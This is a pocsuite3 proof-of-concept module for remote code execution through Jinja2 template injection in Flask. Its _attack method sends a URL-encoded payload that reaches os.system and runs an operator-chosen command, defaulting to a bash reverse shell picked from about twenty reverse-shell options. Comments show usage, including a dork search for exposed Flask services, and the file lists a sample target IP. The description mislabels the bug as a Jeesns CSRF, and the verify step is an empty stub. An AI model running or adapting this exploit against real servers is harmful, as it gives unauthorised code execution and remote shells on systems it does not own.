#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import requests
from collections import OrderedDict
from urllib.parse import urljoin
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY

class DemoPOC(POCBase):
    vulID = '1.1'
    version = '1.1'
    author = ['big04dream']
    vulDate = '2020-03-03'
    createDate = '2020-03-03'
    updateDate = '2020-03-03'
    references = ['https://www.seebug.org/vuldb/ssvid-97938']
    name = 'flask debug mode'
    appPowerLink = 'flask'
    appName = 'flask'
    appVersion = '0.12.2'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''
        flask debug mode
        Jeesns CSRF Vulnerability
    '''
    samples = ['http://96.234.71.117:80']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
            "perl": REVERSE_PAYLOAD.PERL,
            "php": REVERSE_PAYLOAD.PHP,
            "python": REVERSE_PAYLOAD.PYTHON,
            "ruby": REVERSE_PAYLOAD.RUBY,
            "awk": REVERSE_PAYLOAD.AWK,
            "java": REVERSE_PAYLOAD.JAVA,
            "xterm": REVERSE_PAYLOAD.XTERM,
            "golang": REVERSE_PAYLOAD.GOLANG,
            "socat": REVERSE_PAYLOAD.SOCAT,
            "lua": REVERSE_PAYLOAD.LUA,
            "powershell": REVERSE_PAYLOAD.POWERSHELL,
            "telnet": REVERSE_PAYLOAD.TELNET,
            "nodejs": REVERSE_PAYLOAD.NODEJS,
            "rm": REVERSE_PAYLOAD.RM,
            "sh": REVERSE_PAYLOAD.SH,
            "jsp": REVERSE_PAYLOAD.JSP,
            "pl": REVERSE_PAYLOAD.PL,
            "c": REVERSE_PAYLOAD.C,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o
    def _verify(self):
        output = Output(self)
        result = {}

    def _attack(self):
        result = {}
        path = "?name="
        url = self.url + path
        cmd = self.get_option("command")
        payload = '%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()' \
            '%20%25%7D%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%' \
            '7D%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%7B%25' \
            '%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%7B%7B%20b%5B%27' \
            'system%27%5D%28%27{}%27%29%20%7D%7D%7B%25%20endfor%20%25%7D%7B%25%20endf' \
            'or%20%25%7D%7B%25%20endfor%20%25%7D'.format(cmd)
        '''
        {% for c in [].__class__.__base__.__subclasses__() %}
            {% if c.__name__ == 'catch_warnings' %}
                {% for b in c.__init__.__globals__.values() %}
                    {% if b.__class__ == {}.__class__ %}
                        {% if 'eval' in b.keys() %}
                            {{ b['eval']('__import__("os").popen("dir").read()') }}
                        {% endif %}
                    {% endif %}
                {% endfor %}
            {% endif %}
        {% endfor %}
        '''
        try:
            resq = requests.get(url + payload)
            t = resq.text
            t = t.replace('\n', '').replace('\r', '')
            t = t.replace(" ", "")
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            return
        return self.parse_attack(result)
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


# python cli.py -r pocs/pocsuie3_flask.py -u http://$ip:5000 --verify
# python cli.py -r pocs/pocsuie3_flask.py --dork "service:flask" --vul-keyword "flask"
register_poc(DemoPOC)